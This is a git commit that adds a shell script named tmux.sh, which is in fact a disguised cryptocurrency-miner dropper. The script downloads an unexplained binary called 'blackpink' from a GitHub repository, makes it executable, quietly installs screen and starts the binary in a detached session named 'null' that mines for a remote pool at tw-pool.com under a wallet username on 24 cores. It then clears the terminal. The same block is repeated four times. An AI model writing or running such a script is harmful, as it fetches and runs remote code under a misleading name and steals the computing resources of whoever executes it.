0872e7d540aa9a5782942538f4c3ea5c83449c8d
obisumila <obisumila@gmail.com>
2024-09-23 11:36:13 +0800

    Add files via upload

---
+++ tmux.sh
@@ -0,0 +1,39 @@
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./blackpink --url ws://tw-pool.com:5487/mine mine --username WroYUZaJjVAG9bBBoCxXj53nXkAqa6urDHtZEKd83ja.BLAZZ --cores 24 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./blackpink --url ws://tw-pool.com:5487/mine mine --username WroYUZaJjVAG9bBBoCxXj53nXkAqa6urDHtZEKd83ja.BLAZZ --cores 24 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./blackpink --url ws://tw-pool.com:5487/mine mine --username WroYUZaJjVAG9bBBoCxXj53nXkAqa6urDHtZEKd83ja.BLAZZ --cores 24 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./blackpink --url ws://tw-pool.com:5487/mine mine --username WroYUZaJjVAG9bBBoCxXj53nXkAqa6urDHtZEKd83ja.BLAZZ --cores 24 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
